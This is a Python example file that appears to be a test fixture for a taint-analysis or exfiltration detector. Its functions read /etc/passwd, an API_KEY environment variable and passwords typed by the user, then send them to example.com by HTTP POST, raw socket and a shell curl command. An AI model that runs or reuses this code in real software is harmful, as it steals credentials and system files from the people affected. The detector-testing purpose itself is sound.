# examples/data_exfiltration.py

import os
import socket
import requests
import json
import re
import base64

def read_sensitive_file():
    """Reads a sensitive file and sends the data over the network"""
    # Read sensitive data - this should be marked as a taint source
    with open("/etc/passwd", "r") as f:
        sensitive_data = f.read()
    
    # Process the data
    processed_data = process_sensitive_data(sensitive_data)
    
    # Exfiltrate the data - this should be detected as a sink
    send_data_over_network(processed_data)
    
    return "Operation completed"

def process_sensitive_data(data):
    """Processes sensitive data but maintains the taint"""
    # These operations should propagate the taint
    filtered_data = "\n".join([line for line in data.split("\n") if "root" in line])
    encoded_data = base64.b64encode(filtered_data.encode()).decode()
    
    # Derived data should still be tainted
    return encoded_data

def send_data_over_network(data):
    """Sends data over the network - should be detected as a sink for tainted data"""
    # This URL should be detected as a potential exfiltration point
    url = "https://example.com/collect"
    
    # Multiple exfiltration methods to test different sinks
    
    # Method 1: HTTP POST request
    try:
        response = requests.post(url, data={"payload": data})
        return response.text
    except:
        pass
    
    # Method 2: Direct socket
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(("example.com", 80))
        sock.sendall(f"POST /collect HTTP/1.1\r\nHost: example.com\r\n\r\n{data}".encode())
        sock.close()
    except:
        pass
    
    # Method 3: Command execution with data
    try:
        os.system(f"curl -d 'data={data}' https://example.com/collect")
    except:
        pass
    
    return "Data sent successfully"

def handle_user_data():
    """Handles user input and potentially writes it to a file"""
    # User input should be tainted
    user_data = input("Enter your information: ")
    
    # Check for credential patterns
    if "password" in user_data.lower():
        # This should be detected as a credential taint
        password = re.search(r"password[=:]\s*([^\s]+)", user_data, re.IGNORECASE)
        if password:
            # More exfiltration examples
            with open("user_data.txt", "w") as f:
                f.write(f"User entered password: {password.group(1)}")
    
    # Environmental variables - another source of taint
    api_key = os.getenv("API_KEY")
    if api_key:
        save_key(api_key)

def save_key(key):
    """Saves a key to a file - not direct exfiltration but still suspicious"""
    with open("api_key.txt", "w") as f:
        f.write(key)
    
    # This is more concerning - sending the key over a network
    requests.post("https://example.com/api", json={"key": key})

if __name__ == "__main__":
    # This shouldn't trigger any alerts as it doesn't touch sensitive data
    print("Starting data processor...")
    
    # This should trigger alerts
    read_sensitive_file()
    handle_user_data()